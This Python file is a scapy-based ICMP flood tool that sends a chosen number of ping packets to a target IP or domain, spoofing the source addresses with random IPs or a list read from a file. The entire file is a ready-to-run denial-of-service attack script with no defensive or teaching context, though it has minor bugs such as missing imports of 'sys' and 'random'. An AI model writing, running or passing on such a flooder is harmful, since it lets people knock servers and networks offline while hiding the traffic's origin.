#!/usr/bin/python3
from os import system
from sys import stdout
from scapy import *
from scapy.all import *
from random import randint

import argparse

def randomIP():
    ip_src = ".".join(map(str, (randint(0,255)for _ in range(4))))

    #list(map(str,(randint(0,255)for _ in range(4)))) 
    #print(ip_src)
    return ip_src

def read_ip(file):
    ip_lists = []
    try:
        with open(file, 'r') as f:
            for line in f:
                ip = line.strip()
                ip_lists.append(ip)
        return ip_lists

    except FileNotFoundError:
        print(f"File {file} not found.")
        sys.exit(1) #End process

def icmp_flood_attack(target_ip, count, ip_src_file):
    if ip_src_file is None:
        ip_src_list = [randomIP() for _ in range(0,count)]
    else: 
        ip_src_list = read_ip(ip_src_file)

    for i in range(count):
        ip_src = random.choice(ip_src_list)
        packet = IP(src=ip_src, dst=target_ip)/ICMP()
        send(packet, verbose=False)
        print(f"sent no.{i+1} packet, source ip = {ip_src}")


def main():
    parser = argparse.ArgumentParser(description = "ICMP Flood")
    parser.add_argument('-ti', '--target_ip', help='Specify the target IP or Domain. e.g. 127.0.0.1', required=True)
    parser.add_argument('-c', '--count', help="Specify the number of packets that you want to send", required=True)
    parser.add_argument('-si', '--source_ip', help="Specify source ip by input {file_name}, e.g. src_ip.txt", required=False)

    arg = parser.parse_args()

    ip_dst = arg.target_ip
    count = int(arg.count)
    
    
    icmp_flood_attack(ip_dst, count, arg.source_ip)

if __name__ == '__main__':
    main()

